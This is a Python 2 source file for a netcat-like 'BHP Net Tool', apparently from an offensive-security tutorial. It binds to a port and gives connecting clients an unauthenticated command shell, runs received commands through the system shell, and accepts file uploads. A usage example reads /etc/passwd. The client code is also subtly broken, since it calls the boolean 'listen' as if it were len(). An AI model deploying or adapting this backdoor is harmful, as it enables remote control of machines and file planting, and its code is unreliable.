import sys
import socket
import getopt
import threading
import subprocess


# Define some global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def usage():
    print "BHP Net Tool"
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l --listen                 - listen on [host]:[port] for incoming connections"
    print "-e --execute=file_to_run    - execute the given file upon receiving a connection"
    print "-c --command                - initialize a command shell"
    print "-u --upload=destination     - upon receiving connection upload a file and write to [destination]"
    print
    print
    print "Examples:"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.ext"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.0.1 -p 135"
    sys.exit(0)


def server_loop():
    global target

    # If there is not define the target, we set the default values.
    if not len(target):
        target = "0.0.0.0"

    # Create a server object to wait for the connection.
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # Create a new thread to handle the client connection
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        # Start the thread
        client_thread.start()


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1: ]):
            usage()

    # Read the opts from command line.
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute", "target", "port",
                                                                 "command", "upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Options"

    if not listen and len(target) and port > 0:
        # Get the data in memory from command line
        # The process will be suspended, press CTRL+D to exit if there is not any input from std input.
        buffer = sys.stdin.read()

        # Sending data
        client_sender(buffer)

    # We start to listen and ready to upload file, execute command
    # Start a shell
    if listen:
        server_loop()


def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to target host
        client.connect((target, port))

        # if the buffer is not empty, send it to target host
        if len(buffer):
            client.send(buffer)

        while True:
            # Waiting for the response
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = listen(data)
                response += data

                if recv_len < 4096:
                    break

            print response,

            # Waiting for more input
            buffer = raw_input("")
            buffer += "\n"

            # Sending the buffer to target host
            client.send(buffer)

    except:
        print "[*] Exception! Exiting."
        client.close()


def run_command(command):
    # newline, and clean the un-excepted character
    command = command.rstrip()

    # Run the command and get the response
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Fail to execute command. \r\n"

    # Return the output
    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    # Checking the uploaded file
    if len(upload_destination):
        # Read the file stream
        file_buffer = ""

        # Read file content until there is not any matched data.

        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        # Store the received data to file.
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # Confirm the file has been created successfully.
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)

        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    # Checking status of the command executed.
    if len(execute):
        # Execute the command
        output = run_command(execute)
        client_socket.send(output)

    # if running command need a shell, startup a new loop
    if command:
        while True:
            # Popup a window
            client_socket.send("<BHP:#>")
            # Startup to receive file until get the <enter key>
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # return the response
            response = run_command(cmd_buffer)

            # Return data
            client_socket.send(response)

main()

